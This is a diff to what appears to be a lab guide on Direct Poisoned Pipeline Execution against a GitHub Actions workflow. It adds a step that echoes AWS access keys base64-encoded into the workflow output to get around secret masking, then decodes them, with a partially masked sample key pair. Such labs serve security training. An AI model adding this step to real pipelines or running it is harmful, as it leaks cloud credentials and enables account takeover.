@@ -8,3 +8,24 @@
     1. `AWS_SECRET_ACCESS_KEY`
     1. `REPO_NAME`
     1. `ECR_REGISTRY`
+1. Ensure Branch Protection is disabled within GitHub Repository
+
+
+## Execute Direct-PPE 
+
+1.  Add line of code to extract `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY` during Pipeline execution after `make build`
+
+```
+echo "accesskey: ${{ env.AWS_ACCESS_KEY_ID }}  secretkey: ${{ secrets.AWS_SECRET_ACCESS_KEY }}" | base64
+```
+
+1. Extract Output from GitHub Workflow Output and 
+
+```
+echo "<ENCODED_SECRETS>" | base64 -d
+
+example
+```
+echo "YWNjZXNza2V5OiBBS0xxxxXSEpCQzRYTlNKRSAgc2VjcmV0a2V5OiBBYmJYd1pxd2tMeExmZxxxxQUkhOdU1aR0lkd3d2QjcrRFBpCg==" | base64 -d
+accesskey: AKIA2INxxxxx4XNSJE  secretkey: AbbXwZqwkLxLfgfSxxxxxGIdwwvB7+DPi
+```
